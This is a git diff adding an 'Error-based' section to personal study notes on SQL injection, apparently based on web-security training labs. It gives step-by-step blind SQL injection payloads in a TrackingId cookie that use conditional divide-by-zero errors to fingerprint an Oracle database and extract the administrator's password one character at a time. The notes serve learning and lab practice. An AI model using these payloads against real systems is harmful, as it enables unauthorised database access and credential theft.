@@ -40,6 +40,33 @@
 >8) `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§` ->2nd character
 >And so on...
 
+## Error-based
+
+### triggering conditional errors
+
+- simple example:
+> `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` -> evaluates to `'a'` => no error 
+> `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` -> evaluates to `1/0` => divide-by-zero error
+> => **you can retrieve data by testing one character at a time**: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+- another example:
+  - let's say the original value of the cookie is `TrackingId=xyz`.
+>1) **Modify the cookie**: `TrackingId=xyz'` -> error message is received
+>2) **change it to two quotation marks**: `TrackingId=xyz''` -> the error disappears
+>3) **confirm that the server is interpreting the injection as a SQL query**:
+> - `TrackingId=xyz'||(SELECT '')||'` -> `TrackingId=xyz'||(SELECT '' FROM dual)||'` -> no error => oracle database(as we used dual) 
+> - `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` -> error again
+> 4) **verify that the `users` table exists** -> `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+> 5) **exploit this behavior to test conditions**: 
+> - `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> error received
+> - `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> error disappears
+>6) **check whether the username `administrator` exists**: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+>7) **determine the length of administrator's password**:  `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>§1§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` (use intruder)
+>8) **test the character at each position to determine its value**: 
+>- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+>- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 
+>- and so on...
+/gitcomm
 # Subverting application logic
 
 ## simple attack 
